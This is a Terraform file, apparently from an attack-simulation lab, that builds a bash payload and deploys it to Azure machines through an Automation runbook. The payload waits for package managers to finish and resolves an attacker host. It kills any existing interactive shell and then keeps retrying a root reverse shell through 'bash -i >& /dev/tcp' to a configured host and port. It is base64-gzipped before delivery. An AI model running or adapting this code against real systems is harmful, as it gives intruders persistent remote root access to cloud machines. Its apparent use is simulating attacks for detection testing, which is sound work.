
locals {
    host_ip = var.host_ip
    host_port = var.host_port

    payload = <<-EOT
    CHECK_INTERVAL=30

    LOGFILE=/tmp/runbook_attacker_exec_reverseshell_target.log
    function log {
        echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1"
        echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1" >> $LOGFILE
    }
    MAXLOG=2
    for i in `seq $((MAXLOG-1)) -1 1`; do mv "$LOGFILE."{$i,$((i+1))} 2>/dev/null || true; done
    mv $LOGFILE "$LOGFILE.1" 2>/dev/null || true
    check_package_manager() {
        pgrep -f "apt" || pgrep -f "dpkg" || pgrep -f "yum" || pgrep -f "rpm"
    }
    while check_package_manager; do
        log "Waiting for package manager to be available..."
        sleep 10
    done
    log "attacker Host: ${local.host_ip}:${local.host_port}"
    server="${local.host_ip}"
    # Check if $server is an IP address
    if [[ $server =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
        log "server is set to IP address $server, no need to resolve DNS"
    else
        log "checking dns resolution: $server"
        while true; do
            ip=$(dig +short $server)
            if [ -z "$ip" ]; then  # If $ip is empty, the domain hasn't resolved yet
                echo "DNS resolution for $server not yet resolving - waiting $CHECK_INTERVAL seconds..."
                sleep $CHECK_INTERVAL
            else
                echo "$server resolved to $ip"
                break
            fi
        done
    fi
    kill -9 $(ps aux | grep '/bin/bash -c bash -i' | head -1 | awk '{ print $2 }')
    log "running: sudo /bin/bash -c 'bash -i >& /dev/tcp/${local.host_ip}/${local.host_port} 0>&1'"
    
    log "reconnecting: ${local.host_ip}:${local.host_port}"
    while ! sudo /bin/bash -c 'bash -i >& /dev/tcp/${local.host_ip}/${local.host_port} 0>&1'; do
        log "Connection not yet available for ${local.host_ip}:${local.host_port} - waiting $CHECK_INTERVAL seconds...";
        sleep $CHECK_INTERVAL;
    done;
    log "done"
    EOT
    base64_payload = base64gzip(local.payload)
}

#####################################################
# RUNBOOK
#####################################################

module "runbook" {
    source = "../../../../../../common/azure/runbook/base"
    environment                 = var.environment
    deployment                  = var.deployment
    region                      = var.region
    
    resource_group              = var.resource_group
    automation_account          = var.automation_account
    automation_princial_id      = var.automation_princial_id
    tag                         = var.tag
        
    base64_payload              = local.base64_payload 
}